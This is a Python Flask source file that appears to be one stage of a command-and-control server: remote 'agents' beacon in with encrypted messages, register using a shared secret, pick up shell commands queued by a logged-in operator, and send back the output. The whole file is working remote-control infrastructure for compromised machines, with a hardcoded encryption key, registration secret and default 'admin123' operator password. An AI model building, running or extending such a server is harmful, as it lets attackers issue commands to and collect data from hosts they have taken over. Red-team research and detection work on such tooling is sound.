"""
SERVER — Stage 17b (User Auth + Persistent DB + Login)

Matches: agent/stages/stage17b_presistance.go

What this adds:
- Operator login with bcrypt password
- Session-based auth for operator routes
- All state in SQLite (survives server restarts)
- /dashboard page (basic HTML)
"""

import base64, json, os, uuid, sqlite3, threading, time, secrets
from flask import Flask, request, jsonify, session, redirect, url_for
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime
import bcrypt

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

SECRET_KEY          = b"01234567890123456789012345678901"
REGISTRATION_SECRET = "shadownet-secret"
HEARTBEAT_TIMEOUT   = 30
DB_FILE             = "stage17b.db"

# ── Crypto ─────────────────────────────────────────────────────

def encrypt(data):
    aes = AESGCM(SECRET_KEY); nonce = os.urandom(12)
    return base64.b64encode(nonce + aes.encrypt(nonce, json.dumps(data).encode(), None)).decode()

def decrypt(enc):
    raw = base64.b64decode(enc)
    return json.loads(AESGCM(SECRET_KEY).decrypt(raw[:12], raw[12:], None).decode())

# ── Database ────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute('''CREATE TABLE IF NOT EXISTS users (
        username TEXT PRIMARY KEY, password_hash TEXT)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS agents (
        agent_id TEXT PRIMARY KEY, hostname TEXT, status TEXT, last_seen REAL)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS tasks (
        task_id TEXT PRIMARY KEY, agent_id TEXT,
        command TEXT, status TEXT, output TEXT, created_at TEXT)''')
    # Seed default admin if not exists
    row = conn.execute("SELECT 1 FROM users WHERE username='admin'").fetchone()
    if not row:
        pw_hash = bcrypt.hashpw(b"admin123", bcrypt.gensalt()).decode()
        conn.execute("INSERT INTO users VALUES ('admin', ?)", (pw_hash,))
        print("[+] Default admin user created (password: admin123)")
    conn.commit(); conn.close()

# ── Auth decorator ─────────────────────────────────────────────

def login_required(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        if "username" not in session:
            return redirect(url_for("login_page"))
        return f(*args, **kwargs)
    return decorated

# ── Auth routes ─────────────────────────────────────────────────

@app.route("/login", methods=["GET"])
def login_page():
    return "<form method=POST action=/login>Username: <input name=username><br>Password: <input name=password type=password><br><button>Login</button></form>"

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "").encode()
    conn = sqlite3.connect(DB_FILE)
    row  = conn.execute("SELECT password_hash FROM users WHERE username=?", (username,)).fetchone()
    conn.close()
    if row and bcrypt.checkpw(password, row[0].encode()):
        session["username"] = username
        return redirect(url_for("list_agents"))
    return "Invalid credentials", 401

@app.route("/logout", methods=["POST"])
def logout():
    session.clear()
    return redirect(url_for("login_page"))

# ── Beacon (agent-facing) ───────────────────────────────────────

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

@app.route("/beacon", methods=["POST"])
def beacon():
    payload  = decrypt(request.json["data"])
    agent_id = payload.get("agent_id")
    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400

    conn = sqlite3.connect(DB_FILE)
    row  = conn.execute("SELECT 1 FROM agents WHERE agent_id=?", (agent_id,)).fetchone()

    if not row:
        if payload.get("registration_secret") != REGISTRATION_SECRET:
            conn.close()
            return jsonify({"error": "unauthorized"}), 403
        conn.execute("INSERT INTO agents VALUES (?,?,?,?)",
                     (agent_id, payload.get("hostname", "?"), "online", time.time()))
    else:
        conn.execute("UPDATE agents SET status='online', last_seen=? WHERE agent_id=?",
                     (time.time(), agent_id))

    if payload.get("ack"):
        conn.execute("UPDATE tasks SET status='ack' WHERE task_id=?", (payload["ack"],))
    if payload.get("output") and payload.get("task_id"):
        conn.execute("UPDATE tasks SET status='completed', output=? WHERE task_id=?",
                     (payload["output"], payload["task_id"]))
        print(f"\n[OUTPUT]\n{payload['output']}\n{'='*40}")

    row = conn.execute(
        "SELECT task_id, command FROM tasks WHERE agent_id=? AND status='queued' LIMIT 1",
        (agent_id,)).fetchone()
    task = None
    if row:
        task = {"id": row[0], "cmd": row[1]}
        conn.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (row[0],))

    conn.commit(); conn.close()
    return jsonify({"data": encrypt({"task": task})})

# ── Operator routes ─────────────────────────────────────────────

@app.route("/agents")
@login_required
def list_agents():
    conn = sqlite3.connect(DB_FILE)
    rows = conn.execute("SELECT agent_id, hostname, status, last_seen FROM agents").fetchall()
    conn.close()
    return jsonify([{"agent_id": r[0], "hostname": r[1],
                     "status": r[2], "last_seen": r[3]} for r in rows])

@app.route("/command", methods=["POST"])
@login_required
def queue_command():
    data = request.get_json()
    tid  = str(uuid.uuid4())
    conn = sqlite3.connect(DB_FILE)
    conn.execute("INSERT INTO tasks VALUES (?,?,?,'queued',?,?)",
                 (tid, data["agent_id"], data["cmd"], None,
                  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit(); conn.close()
    return jsonify({"task_id": tid})

init_db()

if __name__ == "__main__":
    print("[*] Stage 17b server started — auth + persistent DB")
    print("[*] Login: admin / admin123")
    app.run(host="0.0.0.0", port=8080, debug=False)
